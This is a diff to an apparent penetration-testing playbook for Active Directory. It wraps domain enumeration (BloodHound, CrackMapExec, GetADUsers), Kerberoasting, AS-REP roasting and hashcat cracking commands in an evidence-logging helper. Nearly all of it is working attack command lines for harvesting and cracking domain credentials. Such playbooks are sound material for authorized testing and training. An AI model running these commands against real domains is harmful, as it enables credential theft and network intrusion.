@@ -13,22 +13,36 @@ Keep a running credential file — reuse is rampant (`bin/cpent cred add/list`).
 
 ## Enumerate
 
+Impacket tools have two naming conventions on Kali — use `bin/cpent impacket <tool.py>` to
+find the right binary. All commands below use evidence capture for auto-logging.
+
 ```
-bloodhound-python -u <u> -p <p> -d <domain> -c all -ns <dc-ip>     # attack paths
-crackmapexec smb <dc-ip> -u <u> -p <p> --users --groups --shares
-GetADUsers.py <domain>/<u>:<p> -dc-ip <dc-ip> -all
-# trusts (cross-forest): nltest /domain_trusts   |  bloodhound "Enabled"+trust edges
+# Use evidence capture for all AD commands:
+bin/cpent ev "bloodhound-python -u <u> -p <p> -d <domain> -c all -ns <dc-ip>" --ip <dc-ip> --zone active-directory --label bloodhound
+bin/cpent ev "$(bin/cpent impacket GetADUsers.py) <domain>/<u>:<p> -dc-ip <dc-ip> -all" --ip <dc-ip> --zone active-directory
+bin/cpent ev "crackmapexec smb <dc-ip> -u <u> -p <p> --users --groups --shares" --ip <dc-ip> --zone active-directory
+
+# trusts (cross-forest): from a Windows foothold
+bin/cpent ev "nltest /domain_trusts" --ip <dc-ip> --zone active-directory --remote winrm --user <u> --secret '<p>'
 ```
 
 ## Kerberos — easy early wins, always try
 
 ```
-# Kerberoast (SPN accounts) — crack -m 13100
-GetUserSPNs.py <domain>/<u>:<p> -request -dc-ip <dc-ip>
+# Find the right impacket binary first:
+GSPN=$(bin/cpent impacket GetUserSPNs.py)
+GNPU=$(bin/cpent impacket GetNPUsers.py)
+
+# Kerberoast (SPN accounts) — crack with hashcat -m 13100
+bin/cpent ev "$GSPN <domain>/<u>:<p> -request -dc-ip <dc-ip>" --ip <dc-ip> --zone active-directory --label kerberoast
 # across a forest trust: add -target-domain <trusted.forest>
-# AS-REP roast (no-preauth users) — crack -m 18200
-GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
-hashcat -m 13100 hash.txt wordlist      # or -m 18200 for AS-REP
+
+# AS-REP roast (no-preauth users) — crack with hashcat -m 18200
+bin/cpent ev "$GNPU <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>" --ip <dc-ip> --zone active-directory --label asrep
+
+# Crack with best available wordlist:
+hashcat -m 13100 hash.txt $(bin/cpent wordlist brute-full)      # rockyou for Kerberoast
+hashcat -m 18200 hash.txt $(bin/cpent wordlist brute-full)      # rockyou for AS-REP
 ```
 
 ## Lateral movement
